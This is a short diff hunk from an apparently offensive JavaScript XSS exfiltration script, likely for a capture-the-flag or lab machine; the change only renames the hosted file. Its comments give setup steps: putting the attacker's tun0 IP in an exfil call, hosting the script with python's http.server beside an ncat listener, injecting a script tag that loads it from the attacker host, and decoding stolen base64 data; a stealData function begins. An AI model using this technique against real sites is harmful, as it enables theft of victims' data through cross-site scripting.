@@ -35,7 +35,7 @@ function read_body(xhr)
 // 3) Set your own IP in the exfil.open(...) line below (your tun0 / attacker IP).
 // 4) Host this file on a different port than the listener (port 80 is taken by ncat):
 //      python3 -m http.server 8000
-//    and load it through the XSS: <script src="http://YOUR_IP:8000/exfil.js"></script>
+//    and load it through the XSS: <script src="http://YOUR_IP:8000/myexfilxss.js"></script>
 // 5) The base64 body arrives at the end of the POST request: decode it with base64 -d.
 
 function stealData()
